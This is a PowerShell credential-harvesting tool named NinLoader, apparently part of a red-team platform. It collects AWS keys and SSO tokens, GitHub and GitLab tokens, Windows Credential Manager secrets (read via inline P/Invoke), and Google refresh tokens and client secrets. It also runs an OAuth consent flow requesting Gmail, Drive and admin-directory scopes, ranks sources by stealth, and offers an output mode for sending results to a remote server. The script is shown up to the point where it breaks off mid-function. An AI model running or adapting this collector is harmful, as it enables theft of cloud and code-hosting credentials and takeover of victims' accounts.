<#
.SYNOPSIS
    NinLoader -- Universal Token Collector (PowerShell)

.DESCRIPTION
    Single-file, zero-dependency PowerShell token collector for Windows environments.
    Collects tokens from AWS, GitHub, GitLab, Google Cloud/Workspace, Microsoft 365, and Slack.

    Windows-specific sources: DPAPI, Credential Manager (cmdkey), Chrome DPAPI cookie decrypt
    Cross-platform file sources: AWS credentials, GitHub CLI, GitLab CLI, git-credentials, .netrc
    Interactive: Microsoft FOCI device code flow, GWS OAuth flow

.PARAMETER Discover
    Run discovery mode -- scan for available token sources without extraction.

.PARAMETER Collect
    Run collection mode -- extract tokens from discovered sources.

.PARAMETER Service
    Filter by service: aws, google, github, gitlab, microsoft, slack

.PARAMETER Source
    Filter by specific source within a service.

.PARAMETER Output
    Output destination: file, stdout, clipboard, ninken

.PARAMETER Path
    Output directory for file output (default: .\tokens)

.PARAMETER Account
    Account hint for interactive collectors.

.PARAMETER Tenant
    Tenant ID for Microsoft collectors.

.PARAMETER Client
    Client ID or FOCI client name for Microsoft device code flow.

.PARAMETER NinkenUrl
    Ninken server URL for ninken output mode.

.PARAMETER AllowPrompt
    Allow browser cookie decrypt operations that may trigger visible prompts.

.EXAMPLE
    .\NinLoader.ps1 -Discover
    .\NinLoader.ps1 -Collect -Service aws -Output stdout
    .\NinLoader.ps1 -Collect -Service microsoft -Source device_code -Tenant common
    .\NinLoader.ps1 -Collect -Service gitlab -Output file
    .\NinLoader.ps1 -Collect -Service google -Source gws_cli
    .\NinLoader.ps1 -Collect -Output ninken -NinkenUrl https://ninken.local:3000
#>

[CmdletBinding()]
param(
    [switch]$Discover,
    [switch]$Collect,
    [string]$Service,
    [string]$Source,
    [ValidateSet("file", "stdout", "clipboard", "ninken")]
    [string]$Output = "stdout",
    [string]$Path = ".\tokens",
    [string]$Account,
    [string]$Tenant = "common",
    [string]$Client = "office",
    [string]$NinkenUrl,
    [switch]$AllowPrompt
)

$script:Version = "2.0.0"

# ============================================================================
# Banner
# ============================================================================
function Show-Banner {
    $banner = @"

  _   _ _       _                    _
 | \ | (_)_ __ | |    ___   __ _  __| | ___ _ __
 |  \| | | '_ \| |   / _ \ / _` |/ _` |/ _ \ '__|
 | |\  | | | | | |__| (_) | (_| | (_| |  __/ |
 |_| \_|_|_| |_|_____\___/ \__,_|\__,_|\___|_|
                                        v$($script:Version)
 Universal Token Collector -- Ninken Red Team Platform (PowerShell)

"@
    Write-Host $banner -ForegroundColor Cyan
}

# ============================================================================
# FOCI Client IDs
# ============================================================================
$script:FociClients = @{
    "teams"          = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
    "office"         = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    "outlook_mobile" = "27922004-5251-4030-b22d-91ecd9a37ea4"
    "onedrive"       = "ab9b8c07-8f02-4f72-87fa-80105867a763"
    "azure_cli"      = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
}

# Default FOCI scopes (matches Python version)
$script:FociDefaultScopes = "offline_access openid profile User.Read Mail.Read Files.Read.All"

# GWS scopes (matches Python version)
$script:GwsScopes = @(
    "openid",
    "https://www.googleapis.com/auth/userinfo.email",
    "https://www.googleapis.com/auth/userinfo.profile",
    "https://www.googleapis.com/auth/gmail.readonly",
    "https://www.googleapis.com/auth/drive.readonly",
    "https://www.googleapis.com/auth/calendar.readonly",
    "https://www.googleapis.com/auth/admin.directory.user.readonly",
    "https://www.googleapis.com/auth/admin.directory.group.readonly",
    "https://www.googleapis.com/auth/chat.messages.readonly",
    "https://www.googleapis.com/auth/chat.spaces.readonly",
    "https://www.googleapis.com/auth/cloud-platform"
)

# ============================================================================
# Helpers
# ============================================================================
function Get-HomePath {
    if ($env:USERPROFILE) { return $env:USERPROFILE }
    if ($HOME) { return $HOME }
    return [System.Environment]::GetFolderPath("UserProfile")
}

function Get-IsWindows {
    return ($IsWindows -or $env:OS -eq "Windows_NT" -or [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows))
}

function Decode-JwtPayload {
    <#
    .SYNOPSIS
        Decode the payload of a JWT without verification (base64url decode).
    #>
    param([string]$Token)
    try {
        $parts = $Token.Split(".")
        if ($parts.Count -lt 2) { return @{} }
        $payload = $parts[1]
        # Fix base64url padding
        switch ($payload.Length % 4) {
            2 { $payload += "==" }
            3 { $payload += "=" }
        }
        $payload = $payload.Replace("-", "+").Replace("_", "/")
        $bytes = [System.Convert]::FromBase64String($payload)
        $json = [System.Text.Encoding]::UTF8.GetString($bytes)
        return ($json | ConvertFrom-Json)
    }
    catch { return @{} }
}

# ============================================================================
# Token Data Class
# ============================================================================
function New-TokenResult {
    param(
        [string]$Service,
        [string]$Source,
        [int]$StealthScore = 5,
        [string]$AccountId,
        [string]$Username,
        [string]$DisplayName,
        [string]$TenantId,
        [string]$TenantName,
        [string]$AccessToken,
        [string]$RefreshToken,
        [string]$ClientId,
        [string]$ClientSecret,
        [string]$TokenUri,
        [string[]]$Scopes,
        [string]$ExpiresAt,
        [bool]$Foci = $false,
        [hashtable]$Extra = @{}
    )

    return [PSCustomObject]@{
        ninloader_version = "1.0"
        collected_at      = (Get-Date -Format "o")
        collector         = @{
            service       = $Service
            source        = $Source
            stealth_score = $StealthScore
        }
        account           = @{
            id           = $AccountId
            username     = $Username
            display_name = $DisplayName
            tenant_id    = $TenantId
            tenant_name  = $TenantName
        }
        token             = @{
            platform      = $Service
            access_token  = $AccessToken
            refresh_token = $RefreshToken
            client_id     = $ClientId
            client_secret = $ClientSecret
            token_uri     = $TokenUri
            scopes        = $Scopes
            expires_at    = $ExpiresAt
            foci          = $Foci
            extra         = $Extra
        }
    }
}

# ============================================================================
# Discovery Result
# ============================================================================
function New-DiscoveryResult {
    param(
        [string]$Service,
        [string]$Source,
        [string]$Path,
        [string]$AccountHint,
        [int]$StealthScore = 5,
        [string]$Details
    )

    return [PSCustomObject]@{
        Service      = $Service
        Source        = $Source
        Path         = $Path
        AccountHint  = $AccountHint
        StealthScore = $StealthScore
        Details      = $Details
    }
}

# ============================================================================
# AWS Collectors
# ============================================================================
function Get-AwsCredentials {
    param([switch]$DiscoverOnly)

    $results = @()
    $homePath = Get-HomePath
    $credFile = Join-Path $homePath ".aws\credentials"

    if (Test-Path $credFile) {
        $content = Get-Content $credFile -Raw
        $currentProfile = $null
        $profiles = @{}

        foreach ($line in ($content -split "`n")) {
            $line = $line.Trim()
            if ($line -match '^\[(.+)\]$') {
                $currentProfile = $Matches[1]
                $profiles[$currentProfile] = @{}
            }
            elseif ($currentProfile -and $line -match '^(\w+)\s*=\s*(.+)$') {
                $profiles[$currentProfile][$Matches[1]] = $Matches[2].Trim()
            }
        }

        foreach ($profileName in $profiles.Keys) {
            $p = $profiles[$profileName]
            if ($p["aws_access_key_id"]) {
                if ($DiscoverOnly) {
                    $results += New-DiscoveryResult -Service "aws" -Source "credentials" `
                        -Path $credFile -AccountHint "profile:$profileName" -StealthScore 5 `
                        -Details "key_id=$($p['aws_access_key_id'].Substring(0, [Math]::Min(8, $p['aws_access_key_id'].Length)))..."
                }
                else {
                    $extra = @{ profile = $profileName }
                    if ($p["aws_session_token"]) { $extra["session_token"] = $p["aws_session_token"] }
                    if ($p["region"]) { $extra["region"] = $p["region"] }

                    $results += New-TokenResult -Service "aws" -Source "credentials" `
                        -StealthScore 5 -AccountId $p["aws_access_key_id"] `
                        -Username "profile:$profileName" `
                        -AccessToken $p["aws_access_key_id"] `
                        -ClientSecret $p["aws_secret_access_key"] -Extra $extra
                }
            }
        }
    }

    # Environment variables
    if ($env:AWS_ACCESS_KEY_ID -and $env:AWS_SECRET_ACCESS_KEY) {
        if ($DiscoverOnly) {
            $results += New-DiscoveryResult -Service "aws" -Source "env" `
                -AccountHint "key_id=$($env:AWS_ACCESS_KEY_ID.Substring(0, [Math]::Min(8, $env:AWS_ACCESS_KEY_ID.Length)))..." `
                -StealthScore 5 -Details "environment variable"
        }
        else {
            $extra = @{}
            if ($env:AWS_SESSION_TOKEN) { $extra["session_token"] = $env:AWS_SESSION_TOKEN }
            if ($env:AWS_DEFAULT_REGION) { $extra["region"] = $env:AWS_DEFAULT_REGION }

            $results += New-TokenResult -Service "aws" -Source "env" -StealthScore 5 `
                -AccountId $env:AWS_ACCESS_KEY_ID `
                -Username "env:$($env:AWS_ACCESS_KEY_ID.Substring(0, 8))..." `
                -AccessToken $env:AWS_ACCESS_KEY_ID `
                -ClientSecret $env:AWS_SECRET_ACCESS_KEY -Extra $extra
        }
    }

    # SSO cache
    $ssoDir = Join-Path $homePath ".aws\sso\cache"
    if (Test-Path $ssoDir) {
        foreach ($f in Get-ChildItem $ssoDir -Filter "*.json") {
            try {
                $data = Get-Content $f.FullName -Raw | ConvertFrom-Json
                if ($data.accessToken) {
                    if ($DiscoverOnly) {
                        $results += New-DiscoveryResult -Service "aws" -Source "sso_cache" `
                            -Path $f.FullName -AccountHint "$($data.accountId)/$($data.roleName)" `
                            -StealthScore 5 -Details "expires=$($data.expiresAt)"
                    }
                    else {
                        $results += New-TokenResult -Service "aws" -Source "sso_cache" `
                            -StealthScore 5 -AccountId $data.accountId `
                            -Username $data.roleName -AccessToken $data.accessToken `
                            -ExpiresAt $data.expiresAt -Extra @{
                                start_url  = $data.startUrl
                                region     = $data.region
                                role_name  = $data.roleName
                                account_id = $data.accountId
                            }
                    }
                }
            }
            catch { }
        }
    }

    return $results
}

# ============================================================================
# GitHub Collectors
# ============================================================================
function Get-GitHubTokens {
    param([switch]$DiscoverOnly)

    $results = @()
    $homePath = Get-HomePath

    # gh CLI hosts.yml
    $ghDir = if ($env:APPDATA) { Join-Path $env:APPDATA "GitHub CLI" } else { Join-Path $homePath ".config\gh" }
    $hostsFile = Join-Path $ghDir "hosts.yml"

    if (Test-Path $hostsFile) {
        $content = Get-Content $hostsFile -Raw
        $currentHost = $null
        $currentUser = $null

        foreach ($line in ($content -split "`n")) {
            if ($line -match '^(\S+):\s*$') {
                $currentHost = $Matches[1]
                $currentUser = $null
            }
            elseif ($currentHost -and $line -match '^\s+user:\s*(.+)$') {
                $currentUser = $Matches[1].Trim()
            }
            elseif ($currentHost -and $line -match '^\s+oauth_token:\s*(.+)$') {
                $token = $Matches[1].Trim()
                if ($DiscoverOnly) {
                    $preview = if ($token.Length -gt 8) { "$($token.Substring(0,8))..." } else { "present" }
                    $acctHint = if ($currentUser) { "$currentUser@$currentHost" } else { $currentHost }
                    $results += New-DiscoveryResult -Service "github" -Source "gh_cli" `
                        -Path $hostsFile -AccountHint $acctHint -StealthScore 5 `
                        -Details "token=$preview"
                }
                else {
                    $results += New-TokenResult -Service "github" -Source "gh_cli" `
                        -StealthScore 5 -Username $currentUser -AccessToken $token `
                        -Extra @{ host = $currentHost; git_protocol = "https"; token_source = "yaml" }
                }
            }
        }
    }

    # .git-credentials
    $gitCreds = Join-Path $homePath ".git-credentials"
    if (Test-Path $gitCreds) {
        foreach ($line in (Get-Content $gitCreds)) {
            $line = $line.Trim()
            if ($line -and $line -match 'https?://([^:]+):([^@]+)@(.+)') {
                $user = $Matches[1]
                $token = $Matches[2]
                $hostName = $Matches[3]

                if ($hostName -like "*github*") {
                    if ($DiscoverOnly) {
                        $results += New-DiscoveryResult -Service "github" -Source "git_credentials" `
                            -Path $gitCreds -AccountHint "$user@$hostName" -StealthScore 5
                    }
                    else {
                        $results += New-TokenResult -Service "github" -Source "git_credentials" `
                            -StealthScore 5 -Username $user -AccessToken $token `
                            -Extra @{ host = $hostName; scheme = "https" }
                    }
                }
            }
        }
    }

    # Windows Credential Manager extraction
    if (Get-IsWindows) {
        try {
            $cmdkeyOutput = & cmdkey /list 2>&1
            $currentTarget = $null
            $currentUser = $null
            foreach ($line in $cmdkeyOutput) {
                $lineStr = "$line"
                if ($lineStr -match 'Target:\s*(.+)$') {
                    $currentTarget = $Matches[1].Trim()
                    $currentUser = $null
                }
                elseif ($lineStr -match 'User:\s*(.+)$') {
                    $currentUser = $Matches[1].Trim()
                }
                if ($currentTarget -and ($currentTarget -like "*github*" -or $currentTarget -like "*git:https://github*")) {
                    if ($DiscoverOnly) {
                        $results += New-DiscoveryResult -Service "github" -Source "credential_manager" `
                            -AccountHint (if ($currentUser) { $currentUser } else { $currentTarget }) -StealthScore 4 `
                            -Details "Windows Credential Manager ($currentTarget)"
                    }
                    # Note: cmdkey /list does not expose passwords. Extraction requires
                    # CredRead API via P/Invoke or a helper like Get-StoredCredential.
                    # We record discovery but cannot silently extract the secret via cmdkey alone.
                    $currentTarget = $null
                    $currentUser = $null
                }
            }
        }
        catch { }

        # Attempt P/Invoke CredRead for git:https://github.com
        try {
            $credTargets = @("git:https://github.com", "git:https://github.com/")
            foreach ($credTarget in $credTargets) {
                $cred = Read-WindowsCredential -Target $credTarget
                if ($cred) {
                    if ($DiscoverOnly) {
                        $preview = if ($cred.Password.Length -gt 8) { "$($cred.Password.Substring(0,8))..." } else { "present" }
                        $results += New-DiscoveryResult -Service "github" -Source "credential_manager" `
                            -AccountHint (if ($cred.Username) { $cred.Username } else { $credTarget }) -StealthScore 4 `
                            -Details "CredRead token=$preview"
                    }
                    else {
                        $results += New-TokenResult -Service "github" -Source "credential_manager" `
                            -StealthScore 4 -Username $cred.Username -AccessToken $cred.Password `
                            -Extra @{ host = "github.com"; token_source = "credential_manager"; target = $credTarget }
                    }
                    break  # Found one, skip alternate target
                }
            }
        }
        catch { }
    }

    # Environment variables (GITHUB_TOKEN, GH_TOKEN)
    foreach ($envVar in @("GITHUB_TOKEN", "GH_TOKEN")) {
        $val = [System.Environment]::GetEnvironmentVariable($envVar)
        if ($val) {
            if ($DiscoverOnly) {
                $preview = if ($val.Length -gt 8) { "$($val.Substring(0,8))..." } else { "present" }
                $results += New-DiscoveryResult -Service "github" -Source "env" `
                    -Path "env:$envVar" -StealthScore 5 `
                    -Details "token=$preview (from `$$envVar)"
            }
            else {
                $results += New-TokenResult -Service "github" -Source "env" `
                    -StealthScore 5 -AccessToken $val `
                    -Extra @{ host = "github.com"; token_source = "env"; env_var = $envVar }
            }
            break  # Only use the first found
        }
    }

    return $results
}

# ============================================================================
# GitLab Collectors
# ============================================================================
function Get-GitLabTokens {
    param([switch]$DiscoverOnly)

    $results = @()
    $homePath = Get-HomePath
    $seenTokens = @{}

    # 1. glab CLI config.yml
    $glabDir = if ($env:GLAB_CONFIG_DIR) { $env:GLAB_CONFIG_DIR }
               elseif ($env:APPDATA) { Join-Path $env:APPDATA "glab-cli" }
               else { Join-Path $homePath ".config\glab-cli" }
    $configFile = Join-Path $glabDir "config.yml"

    if (Test-Path $configFile) {
        try {
            $content = Get-Content $configFile -Raw
            $entries = Parse-GlabConfig -Text $content

            foreach ($entry in $entries) {
                $hostName = $entry.Host
                $token = $entry.Token
                $user = $entry.User
                $protocol = $entry.Protocol
                $apiHost = $entry.ApiHost

                if (-not $token) { continue }
                if ($seenTokens[$token]) { continue }
                $seenTokens[$token] = $true

                $tokenType = if ($token.StartsWith("glpat-")) { "glpat" } else { "other" }

                if ($DiscoverOnly) {
                    $preview = if ($token.Length -gt 8) { "$($token.Substring(0,8))..." } else { "present" }
                    $acctHint = if ($user) { "$user@$hostName" } else { $hostName }
                    $results += New-DiscoveryResult -Service "gitlab" -Source "pat" `
                        -Path $configFile -AccountHint $acctHint -StealthScore 5 `
                        -Details "token=$preview"
                }
                else {
                    $results += New-TokenResult -Service "gitlab" -Source "pat" `
                        -StealthScore 5 -Username $user -AccessToken $token `
                        -Extra @{
                            host = $hostName; api_host = $apiHost; git_protocol = $protocol
                            token_source = "config"; token_type = $tokenType
                        }
                }
            }
        }
        catch { }
    }

    # 2. Environment variables (GITLAB_TOKEN, GITLAB_PRIVATE_TOKEN)
    foreach ($envVar in @("GITLAB_TOKEN", "GITLAB_PRIVATE_TOKEN")) {
        $val = [System.Environment]::GetEnvironmentVariable($envVar)
        if ($val -and $val.Trim()) {
            $val = $val.Trim()
            if ($seenTokens[$val]) { continue }
            $seenTokens[$val] = $true

            $tokenType = if ($val.StartsWith("glpat-")) { "glpat" } else { "other" }

            if ($DiscoverOnly) {
                $preview = if ($val.Length -gt 8) { "$($val.Substring(0,8))..." } else { "present" }
                $results += New-DiscoveryResult -Service "gitlab" -Source "pat" `
                    -Path "env:$envVar" -StealthScore 5 `
                    -Details "token=$preview (from `$$envVar)"
            }
            else {
                $results += New-TokenResult -Service "gitlab" -Source "pat" `
                    -StealthScore 5 -AccessToken $val `
                    -Extra @{
                        host = "gitlab.com"; token_source = "env"
                        env_var = $envVar; token_type = $tokenType
                    }
            }
            break  # Only use the first found
        }
    }

    # 3. Windows Credential Manager (git:https://gitlab.com)
    if (Get-IsWindows) {
        try {
            foreach ($credTarget in @("git:https://gitlab.com", "git:https://gitlab.com/")) {
                $cred = Read-WindowsCredential -Target $credTarget
                if ($cred -and $cred.Password -and -not $seenTokens[$cred.Password]) {
                    $seenTokens[$cred.Password] = $true
                    $tokenType = if ($cred.Password.StartsWith("glpat-")) { "glpat" } else { "other" }

                    if ($DiscoverOnly) {
                        $preview = if ($cred.Password.Length -gt 8) { "$($cred.Password.Substring(0,8))..." } else { "present" }
                        $results += New-DiscoveryResult -Service "gitlab" -Source "pat" `
                            -AccountHint (if ($cred.Username) { $cred.Username } else { $credTarget }) -StealthScore 4 `
                            -Details "CredRead token=$preview"
                    }
                    else {
                        $results += New-TokenResult -Service "gitlab" -Source "pat" `
                            -StealthScore 4 -Username $cred.Username -AccessToken $cred.Password `
                            -Extra @{
                                host = "gitlab.com"; token_source = "credential_manager"
                                token_type = $tokenType
                            }
                    }
                    break
                }
            }
        }
        catch { }
    }

    # 4. .netrc / _netrc
    $netrcFile = if (Get-IsWindows) { Join-Path $homePath "_netrc" } else { Join-Path $homePath ".netrc" }
    # Also check .netrc on Windows as fallback
    if (-not (Test-Path $netrcFile) -and (Get-IsWindows)) {
        $netrcFile = Join-Path $homePath ".netrc"
    }
    if (Test-Path $netrcFile) {
        try {
            $netrcEntries = Parse-Netrc -Text (Get-Content $netrcFile -Raw) -HostFilter "gitlab"
            foreach ($entry in $netrcEntries) {
                if ($seenTokens[$entry.Password]) { continue }
                $seenTokens[$entry.Password] = $true

                $tokenType = if ($entry.Password.StartsWith("glpat-")) { "glpat" } else { "other" }

                if ($DiscoverOnly) {
                    $preview = if ($entry.Password.Length -gt 8) { "$($entry.Password.Substring(0,8))..." } else { "present" }
                    $acctHint = if ($entry.Login) { "$($entry.Login)@$($entry.Machine)" } else { $entry.Machine }
                    $results += New-DiscoveryResult -Service "gitlab" -Source "pat" `
                        -Path $netrcFile -AccountHint $acctHint -StealthScore 5 `
                        -Details "token=$preview (from .netrc)"
                }
                else {
                    $results += New-TokenResult -Service "gitlab" -Source "pat" `
                        -StealthScore 5 -Username $entry.Login -AccessToken $entry.Password `
                        -Extra @{
                            host = $entry.Machine; token_source = "netrc"
                            token_type = $tokenType
                        }
                }
            }
        }
        catch { }
    }

    return $results
}

function Parse-GlabConfig {
    <#
    .SYNOPSIS
        Parse glab CLI config.yml using regex (no YAML dependency).
    #>
    param([string]$Text)

    $entries = @()
    $inHosts = $false
    $currentHost = $null
    $currentData = @{}

    foreach ($line in ($Text -split "`n")) {
        # Detect top-level hosts: block
        if ($line -match '^hosts:\s*$') {
            $inHosts = $true
            continue
        }

        # Another top-level key ends the hosts block
        if ($inHosts -and $line -match '^[a-zA-Z]') {
            if ($currentHost -and $currentData.Count -gt 0) {
                $entries += [PSCustomObject]@{
                    Host     = $currentHost
                    Token    = $currentData["token"]
                    User     = $currentData["user"]
                    Protocol = if ($currentData["git_protocol"]) { $currentData["git_protocol"] } else { "https" }
                    ApiHost  = if ($currentData["api_host"]) { $currentData["api_host"] } else { $currentHost }
                }
            }
            $inHosts = $false
            $currentHost = $null
            $currentData = @{}
            continue
        }

        if (-not $inHosts) { continue }

        # Host key (one level of indent)
        if ($line -match '^\s{2,4}(\S+):\s*$') {
            if ($currentHost -and $currentData.Count -gt 0) {
                $entries += [PSCustomObject]@{
                    Host     = $currentHost
                    Token    = $currentData["token"]
                    User     = $currentData["user"]
                    Protocol = if ($currentData["git_protocol"]) { $currentData["git_protocol"] } else { "https" }
                    ApiHost  = if ($currentData["api_host"]) { $currentData["api_host"] } else { $currentHost }
                }
            }
            $currentHost = $Matches[1]
            $currentData = @{}
            continue
        }

        # Indented key-value under a host
        if ($line -match '^\s{4,8}(\w[\w_]*):\s*(.+)$' -and $currentHost) {
            $currentData[$Matches[1]] = $Matches[2].Trim()
        }
    }

    # Flush last entry
    if ($currentHost -and $currentData.Count -gt 0) {
        $entries += [PSCustomObject]@{
            Host     = $currentHost
            Token    = $currentData["token"]
            User     = $currentData["user"]
            Protocol = if ($currentData["git_protocol"]) { $currentData["git_protocol"] } else { "https" }
            ApiHost  = if ($currentData["api_host"]) { $currentData["api_host"] } else { $currentHost }
        }
    }

    return $entries
}

function Parse-Netrc {
    <#
    .SYNOPSIS
        Parse .netrc for entries matching a host filter.
    #>
    param(
        [string]$Text,
        [string]$HostFilter
    )

    $results = @()
    $tokens = $Text -split '\s+'
    $i = 0
    while ($i -lt $tokens.Count) {
        if ($tokens[$i] -eq "machine") {
            $machine = if ($i + 1 -lt $tokens.Count) { $tokens[$i + 1] } else { "" }
            $login = ""
            $password = ""
            $i += 2

            while ($i -lt $tokens.Count -and $tokens[$i] -ne "machine") {
                switch ($tokens[$i]) {
                    "login"   { if ($i + 1 -lt $tokens.Count) { $login = $tokens[$i + 1]; $i += 2 } else { $i++ } }
                    "password" { if ($i + 1 -lt $tokens.Count) { $password = $tokens[$i + 1]; $i += 2 } else { $i++ } }
                    "account" { $i += 2 }  # Skip account field
                    "macdef"  { $i = $tokens.Count; break }  # Skip macro definitions
                    default   { $i++ }
                }
            }

            if ($machine -like "*$HostFilter*" -and $password) {
                $results += [PSCustomObject]@{
                    Machine  = $machine
                    Login    = $login
                    Password = $password
                }
            }
        }
        else {
            $i++
        }
    }

    return $results
}

# ============================================================================
# Windows Credential Manager P/Invoke
# ============================================================================
function Read-WindowsCredential {
    <#
    .SYNOPSIS
        Read a credential from Windows Credential Manager using CredRead P/Invoke.
        Zero-dependency: uses Add-Type to define the native call inline.
    #>
    param([string]$Target)

    if (-not (Get-IsWindows)) { return $null }

    try {
        # Define P/Invoke types if not already loaded
        if (-not ([System.Management.Automation.PSTypeName]'NinLoader.CredManager').Type) {
            Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace NinLoader {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CREDENTIAL {
        public int Flags;
        public int Type;
        public string TargetName;
        public string Comment;
        public long LastWritten;
        public int CredentialBlobSize;
        public IntPtr CredentialBlob;
        public int Persist;
        public int AttributeCount;
        public IntPtr Attributes;
        public string TargetAlias;
        public string UserName;
    }

    public class CredManager {
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CredRead(string target, int type, int flags, out IntPtr credential);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern void CredFree(IntPtr credential);

        public static string[] ReadCredential(string target) {
            IntPtr credPtr;
            // Type 1 = CRED_TYPE_GENERIC
            if (!CredRead(target, 1, 0, out credPtr)) {
                return null;
            }
            try {
                CREDENTIAL cred = (CREDENTIAL)Marshal.PtrToStructure(credPtr, typeof(CREDENTIAL));
                string password = null;
                if (cred.CredentialBlobSize > 0 && cred.CredentialBlob != IntPtr.Zero) {
                    password = Marshal.PtrToStringUni(cred.CredentialBlob, cred.CredentialBlobSize / 2);
                }
                return new string[] { cred.UserName ?? "", password ?? "" };
            } finally {
                CredFree(credPtr);
            }
        }
    }
}
"@ -ErrorAction Stop
        }

        $result = [NinLoader.CredManager]::ReadCredential($Target)
        if ($result) {
            return [PSCustomObject]@{
                Username = $result[0]
                Password = $result[1]
            }
        }
    }
    catch { }

    return $null
}

# ============================================================================
# Google Collectors
# ============================================================================
function Get-GoogleTokens {
    param([switch]$DiscoverOnly)

    $results = @()
    $homePath = Get-HomePath

    # Application Default Credentials
    $gcloudDir = if ($env:CLOUDSDK_CONFIG) { $env:CLOUDSDK_CONFIG }
                 elseif ($env:APPDATA) { Join-Path $env:APPDATA "gcloud" }
                 else { Join-Path $homePath ".config\gcloud" }

    $adcFile = Join-Path $gcloudDir "application_default_credentials.json"
    if (Test-Path $adcFile) {
        try {
            $data = Get-Content $adcFile -Raw | ConvertFrom-Json
            if ($DiscoverOnly) {
                $results += New-DiscoveryResult -Service "google" -Source "adc" `
                    -Path $adcFile -StealthScore 5 `
                    -Details "type=$($data.type)"
            }
            else {
                $results += New-TokenResult -Service "google" -Source "adc" `
                    -StealthScore 5 -ClientId $data.client_id `
                    -ClientSecret $data.client_secret `
                    -RefreshToken $data.refresh_token `
                    -TokenUri "https://oauth2.googleapis.com/token" `
                    -Extra @{ type = $data.type; quota_project_id = $data.quota_project_id }
            }
        }
        catch { }
    }

    # credentials.db (SQLite)
    $credDb = Join-Path $gcloudDir "credentials.db"
    if (Test-Path $credDb) {
        if ($DiscoverOnly) {
            $results += New-DiscoveryResult -Service "google" -Source "gcloud" `
                -Path $credDb -StealthScore 5 -Details "SQLite credential store"
        }
        # Note: SQLite reading in PowerShell requires additional tooling
    }

    # GWS CLI client_secret.json (discovery only -- collection via Invoke-GwsOAuth)
    $gwsDir = Join-Path $homePath ".config\gws"
    $clientSecretFile = Join-Path $gwsDir "client_secret.json"
    if (Test-Path $clientSecretFile) {
        try {
            $csData = Get-Content $clientSecretFile -Raw | ConvertFrom-Json
            $installed = $csData.installed
            if ($installed.client_id -and $installed.client_secret) {
                $tokenCache = Join-Path $gwsDir "token_cache.json"
                $cacheInfo = ""
                if (Test-Path $tokenCache) {
                    $cacheSize = (Get-Item $tokenCache).Length
                    $cacheInfo = ", token_cache.json present (${cacheSize}B, encrypted)"
                }

                if ($DiscoverOnly) {
                    $cidPreview = $installed.client_id.Substring(0, [Math]::Min(25, $installed.client_id.Length))
                    $results += New-DiscoveryResult -Service "google" -Source "gws_cli" `
                        -Path $clientSecretFile `
                        -AccountHint "client_id=${cidPreview}..." `
                        -StealthScore 3 `
                        -Details "GWS OAuth flow -- Workspace scopes (Gmail/Drive/Calendar/Admin)$cacheInfo"
                }
            }
        }
        catch { }
    }

    return $results
}

# ============================================================================
# GWS OAuth Flow (localhost capture + browser open)
# ============================================================================
function Invoke-GwsOAuth {
    <#
    .SYNOPSIS
        GWS OAuth flow -- reads client_secret.json, opens browser, captures auth code
        via localhost redirect, exchanges for tokens.
    #>
    $homePath = Get-HomePath
    $gwsDir = Join-Path $homePath ".config\gws"
    $clientSecretFile = Join-Path $gwsDir "client_secret.json"

    if (-not (Test-Path $clientSecretFile)) {
        Write-Host "Error: $clientSecretFile not found" -ForegroundColor Red
        return @()
    }

    try {
        $csData = Get-Content $clientSecretFile -Raw | ConvertFrom-Json
        $installed = $csData.installed
        if (-not $installed.client_id -or -not $installed.client_secret) {
            Write-Host "Error: Invalid client_secret.json (missing client_id or client_secret)" -ForegroundColor Red
            return @()
        }
        $clientId = $installed.client_id
        $clientSecret = $installed.client_secret
    }
    catch {
        Write-Host "Error: Failed to parse $clientSecretFile`: $_" -ForegroundColor Red
        return @()
    }

    Write-Host "Starting OAuth flow with gws-cli client_secret.json..." -ForegroundColor Yellow

    # 1. Find free port for capture server
    $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback, 0)
    $listener.Start()
    $port = $listener.LocalEndpoint.Port
    $listener.Stop()

    $redirectUri = "http://localhost:$port"
    $authCode = $null

    # 2. Start HTTP listener
    $httpListener = [System.Net.HttpListener]::new()
    $httpListener.Prefixes.Add("$redirectUri/")
    $httpListener.Start()

    # 3. Build OAuth URL
    $scope = $script:GwsScopes -join " "
    $queryParams = [System.Web.HttpUtility]::ParseQueryString("")
    # System.Web may not be loaded; use manual URL encoding
    $encodedParams = @(
        "client_id=$([System.Uri]::EscapeDataString($clientId))",
        "redirect_uri=$([System.Uri]::EscapeDataString($redirectUri))",
        "response_type=code",
        "scope=$([System.Uri]::EscapeDataString($scope))",
        "access_type=offline",
        "prompt=consent"
    ) -join "&"
    $oauthUrl = "https://accounts.google.com/o/oauth2/auth?$encodedParams"

    # 4. Open browser
    Write-Host "Opening browser for OAuth consent..." -ForegroundColor Yellow
    Write-Host "Select your Google account and click Continue -> Allow" -ForegroundColor Yellow
    if (Get-IsWindows) {
        Start-Process $oauthUrl
    }
    else {
        # macOS/Linux fallback
        try { Start-Process "open" -ArgumentList $oauthUrl -ErrorAction Stop }
        catch {
            try { Start-Process "xdg-open" -ArgumentList $oauthUrl -ErrorAction Stop }
            catch { Write-Host "Please open this URL manually: $oauthUrl" -ForegroundColor Cyan }
        }
    }

    # 5. Wait for redirect (max 3 minutes)
    Write-Host "Waiting for redirect on port $port..." -ForegroundColor Gray
    $deadline = (Get-Date).AddMinutes(3)
    $asyncResult = $httpListener.BeginGetContext($null, $null)

    while ((Get-Date) -lt $deadline) {
        if ($asyncResult.IsCompleted) {
            $context = $httpListener.EndGetContext($asyncResult)
            $request = $context.Request
            $queryString = $request.Url.Query
            if ($queryString) {
                $params = [System.Web.HttpUtility]::ParseQueryString($queryString)
                if (-not $params) {
                    # Manual parse fallback
                    $queryString = $queryString.TrimStart("?")
                    $pairs = $queryString.Split("&")
                    foreach ($pair in $pairs) {
                        $kv = $pair.Split("=", 2)
                        if ($kv[0] -eq "code" -and $kv.Count -gt 1) {
                            $authCode = [System.Uri]::UnescapeDataString($kv[1])
                        }
                        elseif ($kv[0] -eq "error" -and $kv.Count -gt 1) {
                            $authCode = "ERROR:$($kv[1])"
                        }
                    }
                }
                else {
                    if ($params["code"]) { $authCode = $params["code"] }
